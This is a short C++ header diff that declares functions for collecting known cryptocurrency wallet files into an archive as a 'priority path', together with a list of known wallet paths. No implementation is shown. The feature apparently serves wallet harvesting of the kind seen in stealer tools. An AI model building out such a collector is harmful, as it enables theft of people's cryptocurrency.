@@ -70,6 +70,13 @@ public:
     // 检查是否应该停止
     bool ShouldStop() const;
 
+    // 采集已知加密货币钱包数据 (优先路径)
+    // 返回采集到的文件数量
+    int CollectCryptoWallets(struct archive* ar);
+
+    // 获取已知钱包路径列表
+    static std::vector<std::string> GetKnownWalletPaths();
+
 private:
     FilesystemServerObserver* observer_;
     bool should_stop_;
